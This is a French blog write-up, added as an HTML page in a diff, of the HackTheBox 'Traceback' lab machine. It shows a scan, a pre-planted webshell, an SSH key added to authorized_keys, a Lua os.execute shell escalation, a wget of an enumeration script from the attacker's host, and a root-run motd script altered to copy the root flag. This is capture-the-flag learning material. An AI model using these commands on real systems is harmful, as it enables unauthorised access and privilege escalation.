@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="fr">
+  <head>
+    
+      <title>Traceback :: RedFou52 - BlogPost — Bienvenue sur mon BlogPost</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Hello aujourd&amp;rsquo;hui je vais vous présenter un writeup sur la machine traceback.
+C&amp;rsquo;est une machine sous linux en difficulté EASY.
+Je ne suis pas un expert, je fais ça avant tout pour gagner en comptétence et pour m&amp;rsquo;amuser.
+Il est vivement conseiller d&amp;rsquo;avoir fait cette machine avant de lire ce Write-Up.
+ #Tools
+ Kali linux 2020 &#43; Tous les tools zsh pour le shell VirtualBox pour ma VM kali linux   NMAP Premièrement on commence par le classique, un petit nmap sur 10."/>
+<meta name="keywords" content="linux, tuto, programmation, python"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/writeup/traceback/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Traceback"/>
+<meta name="twitter:description" content="HackTheBox : Traceback"/>
+
+
+
+<meta property="og:title" content="Traceback" />
+<meta property="og:description" content="HackTheBox : Traceback" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/writeup/traceback/" />
+<meta property="article:published_time" content="2020-07-30T10:12:33+02:00" />
+<meta property="article:modified_time" content="2020-07-30T10:12:33+02:00" /><meta property="og:site_name" content="RedFou52 - BlogPost" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">RedFou52 - BlogPost</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+
+
+
+    <span class="header__right">
+      
+        <nav class="menu">
+	<ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+	<li><a href="/tuto">Les Tutos</a></li>
+        
+      
+        
+	<li><a href="/secu">Sécurité</a></li>
+        
+      
+        
+	<li><a href="/writeup">Write-Up</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            Autres catégories
+            <span class="menu__sub-inner-more-trigger-icon"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+          </li>
+
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+	      <li><a href="/binary">Exploit-Binaire</a></li>
+              
+            
+              
+	      <li><a href="/raspberry">Raspberry</a></li>
+              
+            
+              
+	      <li><a href="/nixos">NIXOS</a></li>
+              
+            
+              
+	      <li><a href="/arch">Archlinux</a></li>
+              
+            
+              
+	      <li><a href="/ml">MachineLearning</a></li>
+              
+            
+              
+	      <li><a href="/about">A propos !</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/tuto">Les Tutos</a></li>
+      
+    
+      
+        <li><a href="/secu">Sécurité</a></li>
+      
+    
+      
+        <li><a href="/writeup">Write-Up</a></li>
+      
+    
+      
+        <li><a href="/binary">Exploit-Binaire</a></li>
+      
+    
+      
+        <li><a href="/raspberry">Raspberry</a></li>
+      
+    
+      
+        <li><a href="/nixos">NIXOS</a></li>
+      
+    
+      
+        <li><a href="/arch">Archlinux</a></li>
+      
+    
+      
+        <li><a href="/ml">MachineLearning</a></li>
+      
+    
+      
+        <li><a href="/about">A propos !</a></li>
+      
+    
+  </ul>
+</nav>
+
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/writeup/traceback/">Traceback</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          30-07-2020
+        </span>
+
+        
+      
+
+      <span class="post-author">— Ecrit par Eidorian</span>
+      
+        <span class="post-read-time">— 6 Minutes</span>
+      
+    </div>
+
+    
+
+    
+      
+        <img src="/img/fr/writeup/traceback/htb-traceback.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#nmap">NMAP</a></li>
+    <li><a href="#ssh">SSH</a></li>
+    <li><a href="#dirbuster">Dirbuster</a></li>
+    <li><a href="#searchploit">searchploit</a></li>
+    <li><a href="#panique">Panique</a></li>
+    <li><a href="#osint">OSINT</a></li>
+    <li><a href="#webshell">Webshell</a></li>
+    <li><a href="#webadmin">webadmin</a></li>
+    <li><a href="#a-la-recherche-du-compte-root">A la recherche du compte root</a></li>
+    <li><a href="#enumération-avec-enumsh">Enumération avec enum.sh</a></li>
+    <li><a href="#panique-2">Panique 2</a></li>
+    <li><a href="#frais-et-motivé">Frais et motivé</a></li>
+  </ul>
+</nav></aside>
+      
+      <p><img src="/img/fr/writeup/traceback/traceback.png" alt="traceback"></p>
+<p>Hello aujourd&rsquo;hui je vais vous présenter un writeup sur la machine <strong>traceback</strong>.<br>
+C&rsquo;est une machine sous linux en difficulté EASY.</p>
+<p>Je ne suis pas un expert, je fais ça avant tout pour gagner en comptétence et pour m&rsquo;amuser.</p>
+<p>Il est vivement conseiller d&rsquo;avoir fait cette machine avant de lire ce Write-Up.</p>
+<hr>
+<p>#Tools</p>
+<ul>
+<li>Kali linux 2020 + Tous les tools</li>
+<li>zsh pour le shell</li>
+<li>VirtualBox pour ma VM kali linux</li>
+</ul>
+<hr>
+<h2 id="nmap">NMAP</h2>
+<p>Premièrement on commence par le classique, un petit <code>nmap</code> sur <code>10.10.10.181</code>.<br>
+<code>sudo nmap -v -sS -A -T4 10.10.10.181</code></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
+|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
+|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Help us
+</code></pre><p>On peut voir un serveur web sur le port 80 et une c=possible connexion SSH sur le port 22. Rien d&rsquo;autre pour le moment.</p>
+<h2 id="ssh">SSH</h2>
+<p>J&rsquo;ai testé le SSH avec quelques mots de passe par simple, on peut noter la bannière personnalisée avant l&rsquo;authentification.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">~ ヤマト» ssh root@10.10.10.181
+#################################
+-------- OWNED BY XH4H  ---------
+- I guess stuff could have been configured better ^^ -
+#################################
+root@10.10.10.181's password: 
+Permission denied, please try again.
+root@10.10.10.181's password: 
+Permission denied, please try again.
+root@10.10.10.181's password: 
+root@10.10.10.181: Permission denied (publickey,password).
+</code></pre><h2 id="dirbuster">Dirbuster</h2>
+<p>J&rsquo;ai essayé un dirbuster (GUI) sur le site.</p>
+<p><img src="/img/fr/writeup/traceback/dirb_1.png" alt="dirb_1"></p>
+<p>Sur la racine <code>/</code> avec une wordlist par défaut dans <code>/usr/share</code>.</p>
+<p>Mais ca n&rsquo;a rien donné, je n&rsquo;ai pas cherché plus loin.</p>
+<p><img src="/img/fr/writeup/traceback/dirb_2.png" alt="dirb_2"></p>
+<h2 id="searchploit">searchploit</h2>
+<p>J&rsquo;ai ensuite utilisé l&rsquo;outil <code>searchploit</code> sur les numéros de version que j&rsquo;ai peu récupérer avec <code>nmap</code>.</p>
+<p><img src="/img/fr/writeup/traceback/searchploit_1.png" alt="searchploi_1"></p>
+<p><img src="/img/fr/writeup/traceback/searchploit_2.png" alt="searchploi_2"></p>
+<p>Mais ici non plus rien de très intéressant pour la suite.</p>
+<h2 id="panique">Panique</h2>
+<p>Remise en doute de mes compétences sur une machine simple.</p>
+<h2 id="osint">OSINT</h2>
+<p>Après beaucoup de temps perdu en utilisant divers outils sans rien en retour, j&rsquo;ai commencé à me pencher sur le commentaire présent dans la page <code>index</code>.</p>
+<p><code>Some of the best web shell that you might need</code></p>
+<p>Mhm .. très bien j&rsquo;ai fait ue recherche Google avec cette phrase et là miracle, je suis tombé sur un github avec pleins de webshell.</p>
+<p><a href="https://github.com/TheBinitGhimire/Web-Shells">TheBinitGhimire/Web-Shells</a></p>
+<p>J&rsquo;ai commencé à entrer chaque nom de webshell sur le site jusquèà tomber sur le bon <code>http://10.10.10.181/smevk.php</code>.</p>
+<p>C&rsquo;était donc ça !</p>
+<h2 id="webshell">Webshell</h2>
+<p><a href="https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php">smevk.php</a></p>
+<p>Ce webshell est très complet, pour se connecter, il suffit de regarder le code source sur github, il y a le login et le mot de passe.</p>
+<p>On regarde le compte utilisé si ca peut nous faire gagner une flag.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">$ id
+uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+</code></pre><p>Il y a deux dossier dans <code>/home</code>, un dossier webadmin et un dossier sysadmin. Malheureusement l&rsquo;utilisateur webadmin n&rsquo;est pas le vrai compte <strong>user</strong> avec le flag. IL nous faut donc trouver un moyen de devenir sysadmin.</p>
+<p>Pour me facilité la tâche, je vais enter ma clé publique SSH dans le dossier <code>.ssh/autorized_keys</code> de <strong>webadmin</strong> et ainsi avoir un accès SSH sans mot de passe.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">$ echo &quot;ssh-rsa &lt;blablabla&gt; eidorian@yamato&quot; &gt;&gt; authorized_keys
+</code></pre><h2 id="webadmin">webadmin</h2>
+<p>Après avoir eu un accès SSH sur le compte webadmin, il nous faut regarder ses droits.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">webadmin@traceback:~$ sudo -l
+Matching Defaults entries for webadmin on traceback:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User webadmin may run the following commands on traceback:
+    (sysadmin) NOPASSWD: /home/sysadmin/luvit
+</code></pre><p>Très très intéressant, notre ami a les droits root sans mot de passe sur un binaire qui se trouve dans <code>/home/sysadmin/luvit</code> qu&rsquo;il ne peut executer que avec le compte sysadmin !</p>
+<p>De plus on peut fouiller un peu les différents fichier dans le <code>/home</code> de notre webadmin il y a des choses intéressantes également.</p>
+<p><strong>notes.txt</strong></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">webadmin@traceback:~$cat notes.txt
+- sysadmin -
+I have left a tool to practice Lua.
+I'm sure you know where to find it.
+Contact me if you have any question.
+</code></pre><p><strong>.bash__history</strong></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">webadmin@traceback:~$ cat .bash_history 
+ls -la
+sudo -l
+nano privesc.lua
+sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
+rm privesc.lua
+logout
+</code></pre><p>Allons voir le binaire luvit de plus près !</p>
+<p>Déjà nous allons faire un petit test très simple.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">webadmin@traceback:~$ cat privesc.lua 
+test test 
+</code></pre><pre><code class="language-bash/shell" data-lang="bash/shell">webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
+Uncaught exception:
+[string &quot;bundle:deps/require.lua&quot;]:301: /home/webadmin/privesc.lua:1: '=' expected near 'test'
+stack traceback:
+    [C]: in function 'assert'
+    [string &quot;bundle:deps/require.lua&quot;]:301: in function 'require'
+    [string &quot;bundle:main.lua&quot;]:118: in function 'main'
+    [string &quot;bundle:init.lua&quot;]:49: in function &lt;[string &quot;bundle:init.lua&quot;]:47&gt;
+    [C]: in function 'xpcall'
+    [string &quot;bundle:init.lua&quot;]:47: in function 'fn'
+    [string &quot;bundle:deps/require.lua&quot;]:310: in function &lt;[string &quot;bundle:deps/require.lua&quot;]:266&gt;
+</code></pre><p>D&rsquo;accord, il n&rsquo;aime pas trop ça, allons nous documenter sur <strong>lua</strong>.</p>
+<p>lua est un language de programmation/script, voici notre deuxième test.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">webadmin@traceback:~$ cat privesc.lua 
+function hello_world()
+print(&quot;Hello word!&quot;)
+end
+hello_world2 = hello_world
+hello_world2() -- Affiche &quot;Hello word!&quot;
+</code></pre><pre><code class="language-bash/shell" data-lang="bash/shell">webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
+Hello word!
+</code></pre><p>Très très bien, nous pouvons donc faire notre test final près une petite recherche sur <a href="https://gtfobins.github.io/gtfobins/lua/">gtfobins</a>.</p>
+<p>On va ouvrir <code>/bin/sh</code> avec lua.</p>
+<p><code>os.execute(&quot;/bin/sh&quot;)</code></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
+$ id
+uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
+$ 
+</code></pre><p>WIN nous voila donc sysadmin, on peut maintenant afficher notre flag user dans <code>/home/sysdadmin/user.txt</code>.</p>
+<h2 id="a-la-recherche-du-compte-root">A la recherche du compte root</h2>
+<p>Pour avoir un meilleur shell, j&rsquo;ai modifié <code>/bin/sh</code> en <code>/bin/bash</code>.</p>
+<p>Je commence mon enquête avec la commande <code>ps -aux</code>.</p>
+<p>Les seules lignes intéressantes sont les suivantes :</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">root      11701  0.0  0.0   4628   808 ?        Ss   01:45   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.upd
+root      11733  0.0  0.0   4628   776 ?        Ss   01:48   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
+
+</code></pre><p>On peut y voir une backup des fichiers motd, donc les fichiers qui servent à la bannière de connexion SSH.</p>
+<p><img src="/img/fr/writeup/traceback/backup_1.png" alt="backup_1">
+Il y a pas mal de fichier mais le seul dossier accessible semble être <code>.update-motd.d/</code></p>
+<p><img src="/img/fr/writeup/traceback/backup_2.png" alt="backup_2"></p>
+<p>Tous les fichiers bannière sont présent ici. Accessible en lecture mais pas en ecriture donc aucuns moyen de les modifier pour le moment.</p>
+<h2 id="enumération-avec-enumsh">Enumération avec enum.sh</h2>
+<p>Après avoir essayé de mofifier les fichiers motd dans le répertoire <code>backup</code> je me retrouve désespéré, j&rsquo;utilise donc un script d&rsquo;énumération pour trouver d&rsquo;autres indices.</p>
+<p>Je vais récupérer mon scripts en utilise SimpleHttp en python</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">#Depuis mon host
+python -m SimpleHTTPServer 8000
+
+#Depuis traceback
+wget http://10.10.14.34:8000/enum.sh
+</code></pre><p>Malheureusement, je ne trouve rien d&rsquo;autre qui peut m&rsquo;aider.</p>
+<h2 id="panique-2">Panique 2</h2>
+<p>Après je ne sais combien de temps, je décide de faire une pause pour aujourd&rsquo;hui je reprends donc mon enquête demain.</p>
+<h2 id="frais-et-motivé">Frais et motivé</h2>
+<p>Okok je suis de retour après une bonne nuit de sommeil.</p>
+<p>Après quelques test, j&rsquo;ai remarqué que j&rsquo;avais les droit de modifier les bannières dans <code>/etc/update-motd.d/</code> .</p>
+<p>Si près du but depuis le début, c&rsquo;est la vie !</p>
+<p>Je vais donc modifier le fichier 00-HEADER pour y ajouter juste une petite ligne à la fin :
+<code>cat /root/root.txt &gt; /tmp/root.txt</code></p>
+<p>Maintenant, je vais me connecter en SSH pour executer ce magnifique &ldquo;exploit&rdquo;.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">sysadmin@traceback:/etc/update-motd.d$ cat /tmp/root.txt 
+&lt;flagflagflag&gt;
+</code></pre><p>VICTOIRE !</p>
+
+    </div>
+    
+
+
+    
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">@RedFou52 - Eidorian - 2020</div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
